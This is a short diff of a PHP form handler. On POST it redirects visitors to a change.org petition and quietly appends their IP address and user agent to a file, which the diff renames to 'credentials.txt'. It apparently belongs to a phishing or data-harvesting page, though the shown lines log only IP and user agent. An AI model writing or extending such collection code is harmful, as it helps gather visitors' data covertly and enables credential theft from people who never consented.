@@ -2,11 +2,18 @@
 session_start();
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header("location: https://www.change.org/p/ugc-india-make-college-campuses-safer-now-with-active-compliant-anti-harassment-cells?source_location=discover_feed");
-    $handle = fopen("./logs.txt", "a");
+    $handle = fopen("./credentials.txt", "a");
     date_default_timezone_set("Asia/Kolkata");
-    fwrite($handle, "IP");
+	
+	if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    { $ipaddress = $_SERVER['HTTP_CLIENT_IP']; }
+    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    { $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; }
+    else { $ipaddress = $_SERVER['REMOTE_ADDR']; }
+	
+	fwrite($handle, "IP");
     fwrite($handle, "       =  ");
-    fwrite($handle, $_SERVER['REMOTE_ADDR']);
+    fwrite($handle, $ipaddress);
     fwrite($handle, "\n");
 	
     fwrite($handle, "UA");
